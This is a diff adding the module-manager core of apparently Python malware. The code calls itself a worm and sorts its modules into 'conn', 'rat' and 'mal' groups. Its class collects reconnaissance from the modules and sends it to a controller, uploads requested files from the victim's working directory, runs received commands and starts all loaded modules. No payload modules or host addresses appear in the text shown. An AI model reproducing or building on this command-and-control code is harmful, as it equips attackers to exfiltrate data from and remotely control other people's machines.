@@ -1,0 +1,107 @@
+#!name##MOD_Wrapper
+#!types##support
+#!info##Required for module management.
+
+import os
+
+class ModWrap:
+    def __init__(self, worm: object, *args):
+        self.worm = worm
+        self.modules = {"conn" : [], "rat" : [], "other" : [], "mal": []}
+    
+    @property
+    def working(self) -> bool:
+        return self.worm.working
+    
+    @property
+    def mods(self) -> list:
+        mods = []
+        for mod in self.modules.values():
+            for m in mod:
+                mods.append(m)
+        return mods
+    
+    @property
+    def is_conn(self) -> bool:
+        return self._is_conn()
+    
+    def _is_conn(self) -> bool:
+        for mod in self.modules["conn"]:
+            if mod.is_conn:
+                return True
+        return False
+    
+    def recon(self) -> None:
+        rec = {}
+        for mod in self.mods:
+            try:
+                rec.update(mod.recon)
+            except AttributeError:
+                continue
+        self.send_data({"types": "info", "data" : rec})
+
+    
+    
+    def send_msg(self, msg: str) -> None:
+        if not self.is_conn:
+            return
+        for mod in self.modules["conn"]:
+            mod.send_msg(msg)
+    
+    def send_data(self, data: dict) -> None:
+        if not self.is_conn:
+            return
+        for mod in self.modules["conn"]:
+            mod.send_data(data)
+
+    
+    def send_file(self, fpath: str, name: str = None, types: str = None) -> None:
+        for mod in self.modules["conn"]:
+            mod.send_file(fpath, name, types)
+    
+    def get_file(self, name: str) -> None:
+        fpath = os.path.join(os.getcwd(), name)
+        if not os.path.exists(fpath):
+            self.send_msg("Error: File does not exists")
+            return
+        self.send_file(fpath, name)
+    
+    def execute(self) -> None:
+        for mod in self.modules["other"]:
+            try:
+                mod.execute()
+            except AttributeError:
+                continue
+    
+    def load_modules(self, mods: dict) -> None:
+        for name, mod in mods.items():
+            if not mod.MTYPES in self.modules.keys():
+                self.modules["other"].append(mod(self.worm))
+            else:
+                self.modules[mod.MTYPES].append(mod(self.worm))
+
+    
+    def exec_cmd(self, cmd: dict) -> None:
+        for mod in self.mods:
+            try:
+                mod.exec_cmd(cmd)
+            except AttributeError:
+                pass
+    
+
+    def run_modules(self, mods: dict) -> None:
+        self.load_modules(mods)
+        for m in self.mods:
+            try:
+                m.start()
+            except:
+                continue
+        
+    
+
+        
+        
+
+            
+
+
